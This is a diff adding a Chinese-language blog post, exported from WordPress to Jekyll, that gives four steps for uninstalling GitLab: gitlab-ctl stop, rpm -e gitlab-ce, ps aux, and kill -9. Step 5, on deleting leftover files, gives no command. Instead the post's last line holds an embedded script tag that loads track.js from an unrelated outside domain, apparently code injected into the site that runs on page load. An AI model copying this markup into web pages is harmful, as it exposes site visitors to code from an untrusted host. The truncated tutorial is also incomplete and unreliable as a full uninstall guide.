@@ -1,0 +1,56 @@
+---
+layout: post
+title: gitlab卸载
+date: 2022-04-01 16:59:56.000000000 +08:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Linux
+tags: []
+meta:
+  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
+  _edit_last: '1'
+author:
+  login: gavin
+  email: 519077334@qq.com
+  display_name: gavin
+  first_name: ''
+  last_name: ''
+permalink: "/index.php/2022/04/01/gitlab%e5%8d%b8%e8%bd%bd/"
+---
+<p><!-- wp:paragraph --></p>
+<p>1、停止gitlab</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:preformatted --></p>
+<pre class="wp-block-preformatted">gitlab-ctl stop</pre>
+<p><!-- /wp:preformatted --></p>
+<p><!-- wp:paragraph --></p>
+<p>2、卸载gitlab（注意这里写的是gitlab-ce）</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:preformatted --></p>
+<pre class="wp-block-preformatted">rpm -e gitlab-ce</pre>
+<p><!-- /wp:preformatted --></p>
+<p><!-- wp:paragraph --></p>
+<p>3、查看gitlab进程</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:preformatted --></p>
+<pre class="wp-block-preformatted">ps aux | grep gitlab</pre>
+<p><!-- /wp:preformatted --></p>
+<p><!-- wp:image {"id":1470} --></p>
+<figure class="wp-block-image"><img src="{{ site.baseurl }}/wp-content/uploads/2022/04/gitlab.png" alt="" class="wp-image-1470" /></figure>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>4、杀掉第一个进程（就是带有好多.............的进程）</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:preformatted --></p>
+<pre class="wp-block-preformatted">kill -9 18777</pre>
+<p><!-- /wp:preformatted --></p>
+<p><!-- wp:paragraph --></p>
+<p>杀掉后，在ps aux | grep gitlab确认一遍，还有没有gitlab的进程</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>5、删除所有包含gitlab文件</p>
+<p><!-- /wp:paragraph --><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
